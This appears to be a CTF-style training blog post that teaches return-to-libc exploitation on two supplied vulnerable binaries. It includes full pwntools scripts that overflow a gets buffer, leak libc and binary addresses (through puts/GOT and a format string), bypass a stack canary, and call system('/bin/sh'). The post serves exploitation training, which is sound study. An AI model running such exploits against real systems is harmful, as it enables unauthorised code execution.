---
layout: post
author: tourpran
title: Return to libc
categories: pwn-training
tags: ["libc leak", "ret2libc"]
---

![](/assets/images/pwntraining3/pwntrain1.png)

### Introduction:

In this blog we will be trying to leak a libc address and try to get a shell by calling system. Here we will look into 2 challenges with similar attacks but slight variations.

### Challenge 1:

Here we are given a binary and the source for the binary.

[vuln binary](/assets/images/pwntraining3/ret2libc) and 
[vuln c code](/assets/images/pwntraining3/ret2libc.c)

### Solution:

#### Mitigations: 

Lets check out the mitigations for this program.
```bash
checksec --file ./ret2libc
```

![](/assets/images/pwntraining3/pwntrain2.png)

If you don't have checksec installed then 
```bash
sudo apt install checksec
```

**RELRO**:
* Partial RELRO - the got is writeable, nothing much to bother here.


**CANARY**:
* No canary, we can do a overflow peacefully :)

**No eXecute**:
* NX Enabled - this makes sure that the code on the stack is not excecuted.


**PIE**:
* PIE Disabled, we know the address of all the code in the binary.

#### Code walkthrough:

main function: 

![](/assets/images/pwntraining3/pwntrain3.png)

* Since gets is a vulnerable function, we can use it to write more data than what the buffer can hold.
* Also there are no win functions this time. We have to rely on the shared object.
* Lets explore this challenge now.

#### Global Offset Table:

This challenge requires you to know the basics of GOT and PLT. In short GOT is a set of address that points to the function in the glibc (shared library). To know more about [Global offset table go ahead to my old blog](https://tourpran.me/blogs/2020/09/13/got-plt.html). 

#### Exploit Idea:

* Our aim right now is to leak an address in the libc (shared library). Since ASLR will randomise the library we cant access the libc function with same address all the time. 
* There is a function called system in the libc which will pop a shell if we give the address of `/bin/sh` as the parameter.

&#8594; We can use the puts function to call the got of puts, since its already called by our program, the GOT of this function will be resolved ( real address pointing to libc will be filled ).


#### Pseudo code:

**note**: arguments to functions are stored via registers, the first argument is stored in RDI.

```.
"A"*(offset) + p64(address of pop RDI) +  p64(GOT address of puts) + p64(PLT address of puts) + p64(address of main)
```

This code will fill the buffer with garbage and store the GOT address of puts inside the RDI register and then calls puts, this will leak the puts libc address. 

* Now we have the libc puts address.
* All functions and variables in the libc is relative to one another, libc as a whole might change its position but the elements (functions, variables) will be at the same relative distance from one another.
* we can calculate the address of string "/bin/sh" and the address of system function, then we can call the system with the argument to pop a shell.

**note:** You might face a error in the statement movabs. If you encounter this problem, you can rectify it by adding a return instruction before the call to a glibc function, Since adding a return address will make the RSP 16 byte aligned.

#### Exploit:

In real life situation you are not probably using the same libc as the software dev, So to find out the libc version go to [libc.blukat.me](https://libc.blukat.me/).

So always the last 3 digits (hex) of the leak will be same. Use this as an advantage to select your libc version.

![](/assets/images/pwntraining3/pwntrain4.png)

Below is the commented solution. 

```py
#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './ret2libc'
elf = ELF("./ret2libc")

# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# ./exploit.py GDB
gdbscript = '''
b* 0x00000000004011c7
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

p.recvuntil("Are you in?") # recv the output sent by the program.
p.sendline(b"A"*0x60 + b"B"*8 + p64(0x0000000000401016) +  p64(0x000000000040122b) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym.main))
# filling the buffer and RBP + return instruction to tackle the alignment issues + pop RDI to fill it with address of the puts function. add main to return back to main function
p.recvline() # recv unwanted bytes.
leak_puts =hex( u64((p.recvline().rstrip()).ljust(8, b"\x00"))) # recv the puts function and strip the front and back, unpack it and store it as hex.

log.info("puts: "+str(leak_puts)) # make sure you get a address in the libc by logging it.

p.recvuntil("Are you in?") # recv output.
p.sendline(b"B"*0x60 + b"C"*8 + p64(0x000000000040122b) + p64(int(leak_puts, 16) + 0x13000a) + p64(int(leak_puts, 16)-0x32190))
# fill garbage in buffer and pop RDI to fill it with a pointer to "bin/sh" call system.

p.interactive()

```

### Challenge 2:

In this second challenge you are required to perform the same ret2libc but with more security measures to bypass. Below you can download source and bianry.

[vuln binary](/assets/images/pwntraining3/ret2libc_canary) and 
[vuln c code](/assets/images/pwntraining3/ret2libc_canary.c)

### Solution:
Lets do the drill of checking the mitigations.

#### Mitigations:
![](/assets/images/pwntraining3/pwntrain5.png)

**Canary:**
* A set of characters that will be checked before returning. If the value has changed the program aborts.

**No eXecute:**
* NX Enabled - this makes sure that the code on the stack is not excecuted.

**PIE:**
* PIE Enabled, We dont know the address of the code for the binary.

#### Code Walkthrough:

There is only a main function.
![](/assets/images/pwntraining3/pwntrain6.png)

We can see that, here we are getting an input and printing it in an unsafe way. Here we can take advantage of this to leak data in the binary. [Not sure about format string ? Go Here](https://tourpran.me/pwn-training/2021/05/20/format-string-exploitation-training2.html). In the next section we can use the gets function to input more data than the buffer can store.

#### Canary:
Set of characters that is placed in between the return address and the buffer. When a buffer overflow occurs the canary checks itself with a memory copy. If the values has been modified then we know a overflow happened and the program will abort. 

![](/assets/images/pwntraining3/pwntrain7.jpg)

> Bypass: Basically we can leak the canary from format strings and place the canary in the correct spot in the payload. Since we over write the canary with the real canary, it seems there was no overflow.

#### Exploit:

* Lets try to leak some variables from the stack by giving some %p.
* We can store all of them in a list and analyse what is what. 

```py
p = start()

# phase 1 : leaking binary and libc address
p.sendlineafter("So you wanna try again. Go ahead :)", b"%p "*25)
all_leaked = str(p.recvline()).split()
log.info("Info leaked: " + str(all_leaked))
```

![](/assets/images/pwntraining3/pwntrain8.png)

* We can confirm that the address ``0x7ffff7faea03`` is from the libc, nice ! we already got a leak. Attach gdb and check what the address corresponds to.

![](/assets/images/pwntraining3/pwntrain9.png)

Ok this is a libc function, we can calculate the offset of this function from the libc base. Now lets see if any other important info is leaked. :thinking:

Address that is ``0x5555555550a0``, is a address that is winthin the binary, we can calculate the offset like the previous one. 

Finally lets see if the canary is also included in the stack. Yes it is indeed inside the stack and can clearly see it.

![](/assets/images/pwntraining3/pwntrain10.png)

Now to find the position of canary we can set a break point in the address before the ``__stack_chk_fail@plt``. The stack will be stored in the `RCX` register. Create a offset pattern then see what value is in the `RCX` register and place the canary value there to complete the exploit.

Now it is simple. We can simply calculate all the relative offset from the base of binary and libc, So we can now ``pop rdi`` to populate it with the address of `/bin/sh` and call `system`. Below I have given the commented solution.

```py
#!/usr/bin/env python3
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './ret2libc_canary'
elf = ELF("./ret2libc_canary")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# ./exploit.py GDB
gdbscript = '''
b* main+164
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

# phase 1 : leaking binary and libc address
p.sendlineafter("So you wanna try again. Go ahead :)", b"%p "*25) # send format specifier to leak data from the stack
p.recvline() # recv the new line.

all_leaked = str(p.recvline()).split() # store all leaked data as a list.
log.info("Info leaked: " + str(all_leaked)) # log it to make sure everything works fine
libc_base = int(str(all_leaked[0])[2:], 16) - 2013699 # take the first element in the list which is a libc function.
log.info("Libc Base: "+ str(hex(libc_base))) # log it
binary_base = int(str(all_leaked[-6])[2:], 16) - 4256 # calculate the binary offset from the leak.
log.info("binary_base: " + str(hex(binary_base))) # log it
canary = int(str(all_leaked[-4])[2:], 16) # store the canary from the leak

# pahse 2 : usign the leak to ret2libc

buf = b"A"*(0x60+8) + p64(canary) # fill the buffer till the canary and overwrite the canary with real one.
buf += p64(binary_base+0x0000000000001016) # random garbage to fill the rbp
buf += p64(binary_base+0x00000000000012cb) # return address
print(next(libc.search(b'/bin/sh\x00'))) # find the address of libc bin/sh
buf += p64(libc_base + next(libc.search(b'/bin/sh\x00'))) 
buf += p64(binary_base+0x0000000000001016) # return to make sure stack is aligned before a glibc call
buf += p64(libc_base + libc.sym.system) # call system.

p.sendlineafter("Missed again??? I'm so disappointed.", buf)


p.interactive()
```

Hope you loved this challenge in the training !Happy Hacking! :D